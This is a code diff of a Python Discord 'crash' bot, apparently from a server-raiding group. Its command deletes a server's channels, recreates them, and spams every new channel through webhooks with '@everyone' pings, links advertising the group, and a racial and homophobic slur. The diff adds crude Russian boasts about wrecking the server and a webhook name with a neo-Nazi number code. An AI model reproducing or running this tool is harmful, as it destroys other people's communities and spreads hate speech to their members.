@@ -2,6 +2,9 @@ import discord
 import asyncio
 from discord.ext import commands
 
+token = input("чювак вводи токен: ")
+
+
 intents = discord.Intents.default()
 intents.guilds = True
 intents.guild_messages = True
@@ -42,7 +45,7 @@ async def moonik(ctx):
         print(f"❌ Ошибка при удалении канала: {e}")
 
     try:
-        await ctx.author.send(f"✅ Удалено {deleted_count} каналов. Создаю новые...")
+        await ctx.author.send(f"снос {deleted_count} каналов. Создаю новые...")
     except discord.Forbidden:
         print("❌ Не удалось отправить сообщение в ЛС.")
 
@@ -51,19 +54,19 @@ async def moonik(ctx):
 
     for channel in new_channels:
         try:
-            webhook = await channel.create_webhook(name="ArizonaRP")
+            webhook = await channel.create_webhook(name="dsq1488")
             
-            await webhook.send("crash by [MoonsDay Client](https://dsc.gg/moonsday), @everyone niggers is pidors [Telegram](https://t.me/DSQ_squad)", username="ArizonaRP")
+            await webhook.send("crash by [MoonsDay Client](https://dsc.gg/moonsday), @everyone niggers is pidors [Telegram](https://t.me/DSQ_squad)", username="dsq")
             
             await webhook.delete()
             
-            print(f"✅ Вебхук 'ArizonaRP' создан, сообщение отправлено и удалён в канале: {channel.name}")
+            print(f"✅ Вебхук создан и проспамлен! Сервер выебан в рот!")
         except discord.HTTPException as e:
             print(f"❌ Ошибка при работе с вебхуком в канале {channel.name}: {e}")
 
-    print("✅ Новые каналы 'moonsday' созданы и вебхуки настроены!")
+    print("✅ Новые каналы созданы а старые выебаны в рот!")
 
-bot.run("")
+bot.run(token)
 # bot by 
 # hilmanzz [discord]
 # MoonsDay Client - dsc.gg/moonsday
